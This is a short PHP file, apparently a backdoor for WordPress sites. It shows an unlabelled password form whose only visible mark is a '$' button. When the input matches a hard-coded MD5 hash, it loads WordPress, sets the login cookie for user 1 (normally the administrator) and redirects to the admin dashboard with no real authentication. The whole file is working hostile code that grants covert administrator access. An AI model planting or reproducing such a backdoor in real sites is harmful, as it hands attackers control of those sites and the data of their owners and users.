<?php
$correct_secret_hash = '12f5ffcaac86c7e50b8112d080fbfc3f';
if (isset($_POST['secret'])) {
    if (md5($_POST['secret']) !== $correct_secret_hash) {
        die('Invalid secret. Access denied.');
    }
} else {
    echo '<form method="POST">
            <label for="secret"></label>
            <input type="password" name="secret" id="secret" required>
            <button type="submit">$</button>
          </form>';
    exit;
}
require_once('wp-load.php');
$user_id = 1;
$user = get_user_by('id', $user_id);
wp_set_auth_cookie($user_id);
wp_set_current_user($user_id);
wp_redirect(admin_url());
exit;
?>
